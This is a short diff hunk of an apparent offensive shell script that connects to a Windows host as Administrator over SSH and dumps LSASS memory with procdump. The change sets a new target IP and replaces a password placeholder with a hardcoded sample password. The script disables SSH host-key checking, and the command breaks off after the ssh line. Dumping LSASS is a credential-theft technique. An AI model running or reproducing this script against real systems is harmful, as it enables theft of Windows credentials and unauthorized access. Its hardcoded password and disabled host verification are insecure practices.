@@ -4,9 +4,9 @@
 # Usage: Run procdump on target Windows machine
 # Requirements: procdump64.exe on target
 
-TARGET_IP="192.168.56.11"
+TARGET_IP="192.168.50.27"
 WIN_USER="Administrator"
-WIN_PASS="provide_password_here"
+WIN_PASS="YourPassword123!"
 
 echo "[*] Dumping LSASS memory on $TARGET_IP"
 sshpass -p "$WIN_PASS" ssh -o StrictHostKeyChecking=no ${WIN_USER}@${TARGET_IP} \
